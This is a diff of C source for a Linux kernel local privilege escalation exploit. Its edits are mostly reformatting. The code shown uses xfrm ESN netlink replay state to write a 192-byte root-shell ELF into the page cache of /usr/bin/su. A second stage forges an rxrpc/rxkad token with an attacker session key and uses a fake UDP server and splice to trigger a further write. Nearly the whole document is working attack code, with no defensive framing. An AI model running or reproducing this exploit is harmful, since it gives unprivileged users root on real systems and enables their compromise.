@@ -39,6 +39,8 @@
 #define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48 triggers) */
 #define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */
 
+#define EXEC_PATH "/bin/bash"
+
 /*
  * 192-byte minimal x86_64 root-shell ELF.
  *   _start at 0x400078:
@@ -90,8 +92,7 @@ extern int g_su_verbose;
 int g_su_verbose = 0;
 #define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)
 
-static int write_proc(const char *path, const char *buf)
-{
+static int write_proc(const char* path, const char* buf) {
 	int fd = open(path, O_WRONLY);
 	if (fd < 0) return -1;
 	int n = write(fd, buf, strlen(buf));
@@ -99,8 +100,7 @@ static int write_proc(const char *path, const char *buf)
 	return n;
 }
 
-static void setup_userns_netns(void)
-{
+static void setup_userns_netns(void) {
 	uid_t real_uid = getuid();
 	gid_t real_gid = getgid();
 	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
@@ -127,45 +127,43 @@ static void setup_userns_netns(void)
 	close(s);
 }
 
-static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
-{
-	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
+static void put_attr(struct nlmsghdr* nlh, int type, const void* data, size_t len) {
+	struct rtattr* rta = (struct rtattr*)((char*)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
 	rta->rta_type = type;
-	rta->rta_len  = RTA_LENGTH(len);
+	rta->rta_len = RTA_LENGTH(len);
 	memcpy(RTA_DATA(rta), data, len);
 	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
 }
 
-static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
-{
+static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi) {
 	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 	if (sk < 0) return -1;
 	struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
 	if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }
 
-	char buf[4096] = {0};
-	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-	nlh->nlmsg_type  = XFRM_MSG_NEWSA;
+	char buf[4096] = { 0 };
+	struct nlmsghdr* nlh = (struct nlmsghdr*)buf;
+	nlh->nlmsg_type = XFRM_MSG_NEWSA;
 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-	nlh->nlmsg_pid   = getpid();
-	nlh->nlmsg_seq   = 1;
-	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
+	nlh->nlmsg_pid = getpid();
+	nlh->nlmsg_seq = 1;
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
 
-	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
+	struct xfrm_usersa_info* xs = (struct xfrm_usersa_info*)NLMSG_DATA(nlh);
 	xs->id.daddr.a4 = inet_addr("127.0.0.1");
-	xs->id.spi      = htonl(spi);
-	xs->id.proto    = IPPROTO_ESP;
-	xs->saddr.a4    = inet_addr("127.0.0.1");
-	xs->family      = AF_INET;
-	xs->mode        = XFRM_MODE_TRANSPORT;
+	xs->id.spi = htonl(spi);
+	xs->id.proto = IPPROTO_ESP;
+	xs->saddr.a4 = inet_addr("127.0.0.1");
+	xs->family = AF_INET;
+	xs->mode = XFRM_MODE_TRANSPORT;
 	xs->replay_window = 0;
-	xs->reqid       = 0x1234;
-	xs->flags       = XFRM_STATE_ESN;
-	xs->lft.soft_byte_limit   = (uint64_t)-1;
-	xs->lft.hard_byte_limit   = (uint64_t)-1;
+	xs->reqid = 0x1234;
+	xs->flags = XFRM_STATE_ESN;
+	xs->lft.soft_byte_limit = (uint64_t)-1;
+	xs->lft.hard_byte_limit = (uint64_t)-1;
 	xs->lft.soft_packet_limit = (uint64_t)-1;
 	xs->lft.hard_packet_limit = (uint64_t)-1;
-	xs->sel.family  = AF_INET;
+	xs->sel.family = AF_INET;
 	xs->sel.prefixlen_d = 32;
 	xs->sel.prefixlen_s = 32;
 	xs->sel.daddr.a4 = inet_addr("127.0.0.1");
@@ -174,9 +172,9 @@ static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
 	{
 		char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
 		memset(alg_buf, 0, sizeof(alg_buf));
-		struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
-		strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
-		aa->alg_key_len   = 32 * 8;
+		struct xfrm_algo_auth* aa = (struct xfrm_algo_auth*)alg_buf;
+		strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
+		aa->alg_key_len = 32 * 8;
 		aa->alg_trunc_len = 128;
 		memset(aa->alg_key, 0xAA, 32);
 		put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
@@ -184,8 +182,8 @@ static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
 	{
 		char alg_buf[sizeof(struct xfrm_algo) + 16];
 		memset(alg_buf, 0, sizeof(alg_buf));
-		struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
-		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
+		struct xfrm_algo* ea = (struct xfrm_algo*)alg_buf;
+		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
 		ea->alg_key_len = 16 * 8;
 		memset(ea->alg_key, 0xBB, 16);
 		put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
@@ -193,7 +191,7 @@ static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
 	{
 		struct xfrm_encap_tmpl enc;
 		memset(&enc, 0, sizeof(enc));
-		enc.encap_type  = UDP_ENCAP_ESPINUDP;
+		enc.encap_type = UDP_ENCAP_ESPINUDP;
 		enc.encap_sport = htons(ENC_PORT);
 		enc.encap_dport = htons(ENC_PORT);
 		enc.encap_oa.a4 = 0;
@@ -202,12 +200,12 @@ static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
 	{
 		char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
 		memset(esn_buf, 0, sizeof(esn_buf));
-		struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
-		esn->bmp_len       = 1;
-		esn->oseq          = 0;
-		esn->seq           = REPLAY_SEQ;
-		esn->oseq_hi       = 0;
-		esn->seq_hi        = patch_seqhi;
+		struct xfrm_replay_state_esn* esn = (struct xfrm_replay_state_esn*)esn_buf;
+		esn->bmp_len = 1;
+		esn->oseq = 0;
+		esn->seq = REPLAY_SEQ;
+		esn->oseq_hi = 0;
+		esn->seq_hi = patch_seqhi;
 		esn->replay_window = 32;
 		put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
 	}
@@ -216,25 +214,24 @@ static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
 	char rbuf[4096];
 	int n = recv(sk, rbuf, sizeof(rbuf), 0);
 	if (n < 0) { close(sk); return -1; }
-	struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
+	struct nlmsghdr* rh = (struct nlmsghdr*)rbuf;
 	if (rh->nlmsg_type == NLMSG_ERROR) {
-		struct nlmsgerr *e = NLMSG_DATA(rh);
+		struct nlmsgerr* e = NLMSG_DATA(rh);
 		if (e->error) { close(sk); return -1; }
 	}
 	close(sk);
 	return 0;
 }
 
-static int do_one_write(const char *path, off_t offset, uint32_t spi)
-{
+static int do_one_write(const char* path, off_t offset, uint32_t spi) {
 	int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
 	if (sk_recv < 0) return -1;
 	int one = 1;
 	setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
 	struct sockaddr_in sa_d = {
 		.sin_family = AF_INET,
-		.sin_port   = htons(ENC_PORT),
-		.sin_addr   = { inet_addr("127.0.0.1") },
+		.sin_port = htons(ENC_PORT),
+		.sin_addr = { inet_addr("127.0.0.1") },
 	};
 	if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
 		close(sk_recv); return -1;
@@ -278,8 +275,7 @@ static int do_one_write(const char *path, off_t offset, uint32_t spi)
 	return s == 40 ? 0 : -1;
 }
 
-static int verify_byte(const char *path, off_t offset, uint8_t want)
-{
+static int verify_byte(const char* path, off_t offset, uint8_t want) {
 	int fd = open(path, O_RDONLY);
 	if (fd < 0) return -1;
 	uint8_t got;
@@ -288,8 +284,7 @@ static int verify_byte(const char *path, off_t offset, uint8_t want)
 	return got == want ? 0 : -1;
 }
 
-static int corrupt_su(void)
-{
+static int corrupt_su(void) {
 	setup_userns_netns();
 	usleep(100 * 1000);
 
@@ -298,10 +293,10 @@ static int corrupt_su(void)
 	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
 		uint32_t spi = 0xDEADBE10 + i;
 		uint32_t seqhi =
-			((uint32_t)shell_elf[i*4 + 0] << 24) |
-			((uint32_t)shell_elf[i*4 + 1] << 16) |
-			((uint32_t)shell_elf[i*4 + 2] <<  8) |
-			((uint32_t)shell_elf[i*4 + 3]);
+			((uint32_t)shell_elf[i * 4 + 0] << 24) |
+			((uint32_t)shell_elf[i * 4 + 1] << 16) |
+			((uint32_t)shell_elf[i * 4 + 2] << 8) |
+			((uint32_t)shell_elf[i * 4 + 3]);
 		if (add_xfrm_sa(spi, seqhi) < 0) {
 			SLOG("add_xfrm_sa #%d failed", i);
 			return -1;
@@ -318,12 +313,11 @@ static int corrupt_su(void)
 		}
 	}
 	SLOG("wrote %d bytes to %s starting at 0x%x",
-			PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
+		PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
 	return 0;
 }
 
-int su_lpe_main(int argc, char **argv)
-{
+int su_lpe_main(int argc, char** argv) {
 	for (int i = 1; i < argc; i++) {
 		if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
 			g_su_verbose = 1;
@@ -349,12 +343,12 @@ int su_lpe_main(int argc, char **argv)
 	 * after our overwrite) should be 0x31 0xff (xor edi, edi — first
 	 * instruction of the new shellcode). */
 	if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
-			verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
+		verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
 		SLOG("post-write verify failed (target unchanged)");
 		return 1;
 	}
 	SLOG("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
-			ENTRY_OFFSET);
+		ENTRY_OFFSET);
 	return 0;
 }
 /*
@@ -409,7 +403,7 @@ int su_lpe_main(int argc, char **argv)
 #define MSG_SPLICE_PAGES 0x8000000
 #endif
 
-/* ---- rxrpc constants ---- */
+ /* ---- rxrpc constants ---- */
 #define RXRPC_PACKET_TYPE_DATA          1
 #define RXRPC_PACKET_TYPE_ACK           2
 #define RXRPC_PACKET_TYPE_ABORT         4
@@ -457,8 +451,7 @@ static uint8_t SESSION_KEY[8] = {
 /* unshare + map setup                                                  */
 /* =================================================================== */
 
-static int write_file(const char *path, const char *fmt, ...)
-{
+static int write_file(const char* path, const char* fmt, ...) {
 	int fd = open(path, O_WRONLY);
 	if (fd < 0) return -1;
 	char buf[256]; va_list ap; va_start(ap, fmt);
@@ -467,8 +460,7 @@ static int write_file(const char *path, const char *fmt, ...)
 	return r;
 }
 
-static int do_unshare_userns_netns(void)
-{
+static int do_unshare_userns_netns(void) {
 	uid_t real_uid = getuid();
 	gid_t real_gid = getgid();
 	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
@@ -484,7 +476,7 @@ static int do_unshare_userns_netns(void)
 		WARN("gid_map: %s", strerror(errno)); return -1;
 	}
 	LOG("uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within netns",
-			real_uid, real_gid);
+		real_uid, real_gid);
 
 	/* ifup lo */
 	int s = socket(AF_INET, SOCK_DGRAM, 0);
@@ -507,45 +499,42 @@ static int do_unshare_userns_netns(void)
 /* rxrpc key (rxkad v1 token with attacker session key)                 */
 /* =================================================================== */
 
-static long key_add(const char *type, const char *desc,
-		const void *payload, size_t plen, int ringid)
-{
+static long key_add(const char* type, const char* desc,
+	const void* payload, size_t plen, int ringid) {
 	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
 }
 
-static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
-{
-	uint8_t *p = out;
+static int build_rxrpc_v1_token(uint8_t* out, size_t maxlen) {
+	uint8_t* p = out;
 	uint32_t now = (uint32_t)time(NULL);
 	uint32_t expires = now + 86400;
-	*(uint32_t *)p = htonl(0); p += 4;   /* flags */
-	const char *cell = "evil";
+	*(uint32_t*)p = htonl(0); p += 4;   /* flags */
+	const char* cell = "evil";
 	uint32_t clen = strlen(cell);
-	*(uint32_t *)p = htonl(clen); p += 4;
+	*(uint32_t*)p = htonl(clen); p += 4;
 	memcpy(p, cell, clen);
 	uint32_t pad = (4 - (clen & 3)) & 3;
 	memset(p + clen, 0, pad);
 	p += clen + pad;
-	*(uint32_t *)p = htonl(1); p += 4;   /* ntoken */
-	uint8_t *toklen_p = p; p += 4;
-	uint8_t *tokstart = p;
-	*(uint32_t *)p = htonl(2); p += 4;   /* sec_ix = RXKAD */
-	*(uint32_t *)p = htonl(0); p += 4;   /* vice_id */
-	*(uint32_t *)p = htonl(1); p += 4;   /* kvno */
+	*(uint32_t*)p = htonl(1); p += 4;   /* ntoken */
+	uint8_t* toklen_p = p; p += 4;
+	uint8_t* tokstart = p;
+	*(uint32_t*)p = htonl(2); p += 4;   /* sec_ix = RXKAD */
+	*(uint32_t*)p = htonl(0); p += 4;   /* vice_id */
+	*(uint32_t*)p = htonl(1); p += 4;   /* kvno */
 	memcpy(p, SESSION_KEY, 8); p += 8;   /* session_key K */
-	*(uint32_t *)p = htonl(now); p += 4;
-	*(uint32_t *)p = htonl(expires); p += 4;
-	*(uint32_t *)p = htonl(1); p += 4;   /* primary_flag */
-	*(uint32_t *)p = htonl(8); p += 4;   /* ticket_len */
+	*(uint32_t*)p = htonl(now); p += 4;
+	*(uint32_t*)p = htonl(expires); p += 4;
+	*(uint32_t*)p = htonl(1); p += 4;   /* primary_flag */
+	*(uint32_t*)p = htonl(8); p += 4;   /* ticket_len */
 	memset(p, 0xCC, 8); p += 8;          /* ticket */
 	uint32_t toklen = (uint32_t)(p - tokstart);
-	*(uint32_t *)toklen_p = htonl(toklen);
+	*(uint32_t*)toklen_p = htonl(toklen);
 	if ((size_t)(p - out) > maxlen) { errno = E2BIG; return -1; }
 	return (int)(p - out);
 }
 
-static long add_rxrpc_key(const char *desc)
-{
+static long add_rxrpc_key(const char* desc) {
 	uint8_t buf[512];
 	int n = build_rxrpc_v1_token(buf, sizeof(buf));
 	if (n < 0) return -1;
@@ -556,14 +545,13 @@ static long add_rxrpc_key(const char *desc)
 /* AF_ALG pcbc(fcrypt) helpers                                          */
 /* =================================================================== */
 
-static int alg_open_pcbc_fcrypt(const uint8_t key[8])
-{
+static int alg_open_pcbc_fcrypt(const uint8_t key[8]) {
 	int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
 	if (s < 0) { WARN("socket(AF_ALG): %s", strerror(errno)); return -1; }
 	struct sockaddr_alg sa = { .salg_family = AF_ALG };
-	strcpy((char *)sa.salg_type, "skcipher");
-	strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
-	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+	strcpy((char*)sa.salg_type, "skcipher");
+	strcpy((char*)sa.salg_name, "pcbc(fcrypt)");
+	if (bind(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
 		WARN("bind(AF_ALG pcbc(fcrypt)): %s", strerror(errno));
 		close(s); return -1;
 	}
@@ -576,32 +564,31 @@ static int alg_open_pcbc_fcrypt(const uint8_t key[8])
 
 /* Encrypt-or-decrypt a 1+ block of data with a given IV. */
 static int alg_op(int alg_s, int op, const uint8_t iv[8],
-		const void *in, size_t inlen, void *out)
-{
+	const void* in, size_t inlen, void* out) {
 	int op_fd = accept(alg_s, NULL, NULL);
 	if (op_fd < 0) { WARN("accept(AF_ALG): %s", strerror(errno)); return -1; }
 
 	char cbuf[CMSG_SPACE(sizeof(int)) +
-		CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = {0};
-	struct msghdr msg = {0};
+		CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = { 0 };
+	struct msghdr msg = { 0 };
 	msg.msg_control = cbuf;
 	msg.msg_controllen = sizeof(cbuf);
 
-	struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
+	struct cmsghdr* c = CMSG_FIRSTHDR(&msg);
 	c->cmsg_level = SOL_ALG;
 	c->cmsg_type = ALG_SET_OP;
 	c->cmsg_len = CMSG_LEN(sizeof(int));
-	*(int *)CMSG_DATA(c) = op;
+	*(int*)CMSG_DATA(c) = op;
 
 	c = CMSG_NXTHDR(&msg, c);
 	c->cmsg_level = SOL_ALG;
 	c->cmsg_type = ALG_SET_IV;
 	c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
-	struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
+	struct af_alg_iv* aiv = (struct af_alg_iv*)CMSG_DATA(c);
 	aiv->ivlen = 8;
 	memcpy(aiv->iv, iv, 8);
 
-	struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
+	struct iovec iov = { .iov_base = (void*)in, .iov_len = inlen };
 	msg.msg_iov = &iov; msg.msg_iovlen = 1;
 
 	if (sendmsg(op_fd, &msg, 0) < 0) {
@@ -612,7 +599,7 @@ static int alg_op(int alg_s, int op, const uint8_t iv[8],
 	close(op_fd);
 	if (n != (ssize_t)inlen) {
 		WARN("AF_ALG read got %zd want %zu: %s",
-				n, inlen, strerror(errno));
+			n, inlen, strerror(errno));
 		return -1;
 	}
 	return 0;
@@ -624,11 +611,10 @@ static int alg_op(int alg_s, int op, const uint8_t iv[8],
  *   csum_iv = out[8..15]   (last 8 B = "tmpbuf[2..3]" after encryption)
  */
 static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
-		const uint8_t key[8], uint8_t csum_iv[8])
-{
+	const uint8_t key[8], uint8_t csum_iv[8]) {
 	int s = alg_open_pcbc_fcrypt(key);
 	if (s < 0) return -1;
-	uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
+	uint32_t in[4] = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
 	uint8_t  out[16];
 	int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
 	close(s);
@@ -644,9 +630,8 @@ static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
  *   y = ntohl(enc[1]); cksum = (y >> 16) & 0xffff;  if zero -> 1
  */
 static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
-		const uint8_t key[8], const uint8_t csum_iv[8],
-		uint16_t *cksum_out)
-{
+	const uint8_t key[8], const uint8_t csum_iv[8],
+	uint16_t* cksum_out) {
 	int s = alg_open_pcbc_fcrypt(key);
 	if (s < 0) return -1;
 	uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
@@ -667,21 +652,20 @@ static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
 /* AF_RXRPC client                                                      */
 /* =================================================================== */
 
-static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
-{
+static int setup_rxrpc_client(uint16_t local_port, const char* keyname) {
 	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
 	if (fd < 0) { WARN("socket(AF_RXRPC client): %s", strerror(errno)); return -1; }
 	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
-				keyname, strlen(keyname)) < 0) {
+		keyname, strlen(keyname)) < 0) {
 		WARN("client SECURITY_KEY: %s", strerror(errno)); close(fd); return -1;
 	}
 	int min_level = RXRPC_SECURITY_AUTH;
 	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
-				&min_level, sizeof(min_level)) < 0) {
+		&min_level, sizeof(min_level)) < 0) {
 		WARN("client MIN_SECURITY_LEVEL: %s", strerror(errno));
 		close(fd); return -1;
 	}
-	struct sockaddr_rxrpc srx = {0};
+	struct sockaddr_rxrpc srx = { 0 };
 	srx.srx_family = AF_RXRPC;
 	srx.srx_service = 0;
 	srx.transport_type = SOCK_DGRAM;
@@ -689,7 +673,7 @@ static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
 	srx.transport.sin.sin_family = AF_INET;
 	srx.transport.sin.sin_port = htons(local_port);
 	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
-	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
+	if (bind(fd, (struct sockaddr*)&srx, sizeof(srx)) < 0) {
 		WARN("client bind :%u: %s", local_port, strerror(errno));
 		close(fd); return -1;
 	}
@@ -698,11 +682,10 @@ static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
 }
 
 static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
-		uint16_t service_id,
-		unsigned long user_call_id)
-{
+	uint16_t service_id,
+	unsigned long user_call_id) {
 	char data[8] = "PINGPING";
-	struct sockaddr_rxrpc srx = {0};
+	struct sockaddr_rxrpc srx = { 0 };
 	srx.srx_family = AF_RXRPC;
 	srx.srx_service = service_id;
 	srx.transport_type = SOCK_DGRAM;
@@ -712,16 +695,16 @@ static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
 	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
 
 	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
-	struct msghdr msg = {0};
+	struct msghdr msg = { 0 };
 	msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
 	struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
 	msg.msg_iov = &iov; msg.msg_iovlen = 1;
 	msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
-	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+	struct cmsghdr* cmsg = CMSG_FIRSTHDR(&msg);
 	cmsg->cmsg_level = SOL_RXRPC;
 	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
 	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
-	*(unsigned long *)CMSG_DATA(cmsg) = user_call_id;
+	*(unsigned long*)CMSG_DATA(cmsg) = user_call_id;
 
 	/* Don't block forever if no reply ever comes through this single sendmsg. */
 	int fl = fcntl(cli_fd, F_GETFL);
@@ -732,14 +715,14 @@ static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
 	if (n < 0) {
 		if (errno == EAGAIN || errno == EWOULDBLOCK) {
 			LOG("client sendmsg returned EAGAIN (expected; kernel will keep "
-					"retrying handshake)");
+				"retrying handshake)");
 			return 0;
 		}
 		WARN("client sendmsg: %s", strerror(errno));
 		return -1;
 	}
 	LOG("client sendmsg %zd B → :%u (handshake will follow asynchronously)",
-			n, srv_port);
+		n, srv_port);
 	return 0;
 }
 
@@ -747,15 +730,14 @@ static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
 /* fake-server (plain UDP)                                              */
 /* =================================================================== */
 
-static int setup_udp_server(uint16_t port)
-{
+static int setup_udp_server(uint16_t port) {
 	int s = socket(AF_INET, SOCK_DGRAM, 0);
 	if (s < 0) { WARN("socket(udp server): %s", strerror(errno)); return -1; }
-	struct sockaddr_in sa = {0};
+	struct sockaddr_in sa = { 0 };
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
 	sa.sin_addr.s_addr = htonl(0x7F000001);
-	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+	if (bind(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
 		WARN("udp server bind :%u: %s", port, strerror(errno));
 		close(s); return -1;
 	}
@@ -764,15 +746,14 @@ static int setup_udp_server(uint16_t port)
 }
 
 /* Receive one UDP datagram with timeout (ms). Returns bytes or -1. */
-static ssize_t udp_recv_to(int s, void *buf, size_t cap,
-		struct sockaddr_in *from, int timeout_ms)
-{
+static ssize_t udp_recv_to(int s, void* buf, size_t cap,
+	struct sockaddr_in* from, int timeout_ms) {
 	struct pollfd pfd = { .fd = s, .events = POLLIN };
 	int rc = poll(&pfd, 1, timeout_ms);
 	if (rc <= 0) return -1;
 	socklen_t fl = from ? sizeof(*from) : 0;
 	return recvfrom(s, buf, cap, 0,
-			(struct sockaddr *)from, from ? &fl : NULL);
+		(struct sockaddr*)from, from ? &fl : NULL);
 }
 
 /* =================================================================== */
@@ -781,8 +762,7 @@ static ssize_t udp_recv_to(int s, void *buf, size_t cap,
 
 static int trigger_seq = 0;
 
-static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
-{
+static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len) {
 	char keyname[32];
 	snprintf(keyname, sizeof(keyname), "evil%d", trigger_seq++);
 
@@ -821,10 +801,10 @@ static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
 		if (trigger_seq < 5) WARN("udp_recv_to: n=%zd errno=%s", n, strerror(errno));
 		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
 	}
-	struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header *)pkt;
-	uint32_t epoch  = ntohl(whdr_in->epoch);
-	uint32_t cid    = ntohl(whdr_in->cid);
-	uint32_t callN  = ntohl(whdr_in->callNumber);
+	struct rxrpc_wire_header* whdr_in = (struct rxrpc_wire_header*)pkt;
+	uint32_t epoch = ntohl(whdr_in->epoch);
+	uint32_t cid = ntohl(whdr_in->cid);
+	uint32_t callN = ntohl(whdr_in->callNumber);
 	uint16_t svc_in = ntohs(whdr_in->serviceId);
 	uint16_t cli_port = ntohs(cli_addr.sin_port);
 
@@ -833,7 +813,7 @@ static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
 		struct {
 			struct rxrpc_wire_header hdr;
 			struct rxkad_challenge   ch;
-		} __attribute__((packed)) c = {0};
+		} __attribute__((packed)) c = { 0 };
 		c.hdr.epoch = htonl(epoch);
 		c.hdr.cid = htonl(cid);
 		c.hdr.callNumber = 0; c.hdr.seq = 0;
@@ -843,8 +823,8 @@ static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
 		c.hdr.serviceId = htons(svc_in);
 		c.ch.version = htonl(2); c.ch.nonce = htonl(0xDEADBEEFu);
 		c.ch.min_level = htonl(1);
-		struct sockaddr_in to = { .sin_family=AF_INET, .sin_port=htons(cli_port),
-			.sin_addr.s_addr=htonl(0x7F000001) };
+		struct sockaddr_in to = { .sin_family = AF_INET, .sin_port = htons(cli_port),
+			.sin_addr.s_addr = htonl(0x7F000001) };
 		if (sendto(udp_srv, &c, sizeof(c), 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
 			close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
 		}
@@ -857,7 +837,7 @@ static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
 	}
 
 	/* csum + cksum with CURRENT SESSION_KEY */
-	uint8_t csum_iv[8] = {0};
+	uint8_t csum_iv[8] = { 0 };
 	if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0) {
 		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
 	}
@@ -867,7 +847,7 @@ static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
 	}
 
 	/* Build malicious DATA header */
-	struct rxrpc_wire_header mal = {0};
+	struct rxrpc_wire_header mal = { 0 };
 	mal.epoch = htonl(epoch);
 	mal.cid = htonl(cid);
 	mal.callNumber = htonl(callN);
@@ -880,8 +860,8 @@ static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
 	mal.serviceId = htons(svc_in);
 
 	/* connect udp_srv → client port for splice */
-	struct sockaddr_in dst = { .sin_family=AF_INET, .sin_port=htons(cli_port),
-		.sin_addr.s_addr=htonl(0x7F000001) };
+	struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(cli_port),
+		.sin_addr.s_addr = htonl(0x7F000001) };
 	if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
 		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
 	}
@@ -912,7 +892,7 @@ static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
 		char rb[2048];
 		struct sockaddr_rxrpc srx;
 		char ccb[256];
-		struct msghdr m = {0};
+		struct msghdr m = { 0 };
 		struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
 		m.msg_name = &srx; m.msg_namelen = sizeof(srx);
 		m.msg_iov = &iv;  m.msg_iovlen = 1;
@@ -1028,12 +1008,11 @@ static uint32_t fc_sbox0[256], fc_sbox1[256], fc_sbox2[256], fc_sbox3[256];
 
 #include <endian.h>
 
-static void fcrypt_init_sboxes(void)
-{
+static void fcrypt_init_sboxes(void) {
 	for (int i = 0; i < 256; i++) {
 		fc_sbox0[i] = htobe32((uint32_t)fc_sbox0_raw[i] << 3);
 		fc_sbox1[i] = htobe32(((uint32_t)(fc_sbox1_raw[i] & 0x1f) << 27) |
